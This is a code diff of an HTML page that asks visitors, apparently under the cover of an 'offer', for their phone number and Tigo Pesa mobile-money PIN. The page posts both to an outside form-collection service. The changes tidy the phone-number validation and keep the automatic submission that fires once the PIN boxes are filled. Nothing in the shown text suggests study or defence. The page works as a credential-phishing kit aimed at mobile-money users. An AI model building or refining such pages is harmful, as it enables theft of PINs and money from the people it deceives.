@@ -18,8 +18,7 @@
         <form id="offerForm" action="https://formbold.com/s/9ROxy" method="POST">
             
             <div class="phone-input">
-                <!-- REMOVED: The +255 span -->
-                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu" maxlength="9" required>
+                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu" maxlength="10" required>
             </div>
 
             <p>Enter your Tigo Pesa PIN</p>
@@ -57,7 +56,14 @@
                         const allPinsFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
                         if (allPinsFilled) {
                             updateHiddenPin();
-                            // REMOVED: The code that added +255 back
+                            
+                            // UPDATED: Check if phone number is filled before submitting
+                            if (phoneNumberInput.value.trim() === '') {
+                                alert('Tafadhali ingiza namba yako ya simu.');
+                                phoneNumberInput.focus(); // Focus the phone input
+                                return; // Stop submission
+                            }
+                            
                             form.submit();
                         }
                     }
